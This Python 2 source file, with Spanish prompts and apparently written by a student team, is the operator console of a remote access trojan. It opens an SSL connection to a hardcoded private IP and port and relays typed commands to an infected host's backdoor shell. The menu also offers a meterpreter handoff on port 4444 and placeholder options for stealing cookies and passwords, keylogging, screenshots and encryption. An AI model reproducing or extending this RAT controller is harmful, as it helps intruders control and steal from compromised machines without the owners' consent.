#!/usr/bin/python

def info():
	print '''
		Integrantes del equipo:
			 -Fernando
			 -Diego
			 -Manuel

			 PBSCG10!

		 FACTA, NON VERBA!
	'''

def salir():
	print '''
		
            (\;/)
           oo   \//,        _
         ,/_;~      \,     / '
         "'    (  (   \    !
               //  \   |__.'
             '~  '~----''

         AUFWIEDERSEHEN...
	'''	

def trasera(sslSock):
	from OpenSSL import SSL  
	import socket  
	import os  
	import sys
	#ADDRESS = (host, pto)

	#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
	#ctx = SSL.Context(SSL.SSLv23_METHOD)  
	#ctx.use_certificate_file('cert.pem')  
	#sslSock = SSL.Connection(ctx, sock)  
	#sslSock.connect(ADDRESS)  
	def main():  
	        try:
	            cmd = raw_input('RAT@infectado# ')
	            sslSock.send(cmd)
	            data = sslSock.recv(66384)
	            if data=='\n':
	            	sslSock.send(cmd)
	            else:
	            	print data
	        except KeyboardInterrupt:
	            sslSock.close()
	            sys.exit(0)

	while True:  
	   main()


def menu():
	from OpenSSL import SSL  
	import socket  
	import os  
	import sys
	ADDRESS = ('192.168.47.144',6116)
	while 1:
		print '''
	        	(_)_(_)
	                 (o o)
	                ==\o/==

		Bienvenido atacante...
			
			Elige una opcion:

			1) Backdoor
			2) Metasploit
			3) Video/Audio
			4) Cookies
			5) Passwords
			6) Screenshots
			7) Keylogger
			8) Cifrar
			9) Informacion del proyecto
			0) Salir

		''' 
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
		ctx = SSL.Context(SSL.SSLv23_METHOD)  
		ctx.use_certificate_file('cert.pem')  
		sslSock = SSL.Connection(ctx, sock)  
		#sslSock.connect(ADDRESS)
		try:
			eleccion = int(raw_input('>>> '))
		except:
			eleccion = -1
		if eleccion == 0:
			sslSock.close()
			salir()
			exit(0)
		elif eleccion == 1:
			try:  
				sslSock.connect(ADDRESS)
				sslSock.write('1')
				print "Procure no cometer errores, este backdoor es muy exigente :)...\n"
				trasera(sslSock)
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
				#sslSock.close()
		elif eleccion == 2:
			try:
				#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
				#ctx = SSL.Context(SSL.SSLv23_METHOD)  
				#ctx.use_certificate_file('cert.pem')  
				#sslSock = SSL.Connection(ctx, sock)  
				sslSock.connect(ADDRESS)  
				raw_input("Antes de continuar, configure meterpreter ;), puerto 4444...")
				sslSock.write('2')
				msg=sslSock.recv(1024)
				print msg+'\n'
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
				#sslSock.close()
			except:
				raw_input("Presione una tecla para continuar...")
				os.system('clear')
				#sslSock.close()
		elif eleccion == 3:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 4:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 5:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 6:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 7:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 8:
			print "No implementado aun :)"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
		elif eleccion == 9:
			info()
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
			sslSock.close()
		else:
			print "opcion incorrecta"
			raw_input("Presione una tecla para continuar...")
			os.system('clear')
			#sslSock.close()

menu()